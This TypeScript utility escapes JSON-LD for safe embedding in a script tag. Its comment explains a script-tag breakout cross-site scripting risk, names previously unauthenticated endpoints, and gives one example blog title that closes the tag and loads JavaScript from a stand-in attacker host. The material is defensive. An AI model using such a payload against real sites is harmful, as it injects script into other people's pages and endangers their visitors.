/**
 * Serialise structured data for embedding in a `<script type="application/ld+json">`.
 *
 * ## Why `JSON.stringify` alone is not safe here
 *
 * `JSON.stringify` escapes what JSON needs escaped. It does **not** escape
 * `<`, because `<` is a perfectly ordinary character in a JSON string. But the
 * HTML parser does not know it is reading JSON — it is scanning for the closing
 * tag of a `<script>` element, and it finds one the moment the byte sequence
 * `</script>` appears anywhere inside, quoted or not.
 *
 * So a blog post titled:
 *
 * ```
 * AI news </script><script src="https://evil.tld/x.js"></script>
 * ```
 *
 * serialises to valid JSON, terminates the ld+json block early, and executes
 * attacker JavaScript on this origin — with the page then cached by ISR and
 * served to every subsequent visitor.
 *
 * This is not hypothetical for this codebase. Blog documents are read from Mongo
 * and, until the authorisation fixes in this change, `POST /api/data`,
 * `POST /api/admin/blogs` and `POST /api/debug/publish-blog` all accepted an
 * arbitrary `title` from an unauthenticated caller. Closing those endpoints
 * removes today's path to it; it does not make the sink safe. `/api/data` exists
 * to ingest third-party news items, so a hostile upstream headline reaches the
 * same place through a fully authenticated call.
 *
 * ## The fix
 *
 * Escape the characters that mean something to the HTML tokeniser as JSON
 * unicode escapes. `"<"` and `"<"` are the same string to any JSON parser,
 * so the structured data Google reads is byte-identical in meaning while the
 * HTML parser never sees a tag.
 *
 * U+2028 and U+2029 are included because they terminate a line in JavaScript
 * source but are legal unescaped inside a JSON string — a mismatch that has
 * broken JSON-in-script embedding before.
 *
 * Use this everywhere JSON reaches `dangerouslySetInnerHTML`, including on data
 * that is currently trusted. A site that escapes only its untrusted inputs
 * relies on every future author correctly classifying their data source;
 * escaping unconditionally costs nothing and removes the judgement call.
 */
export function jsonLdHtml(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
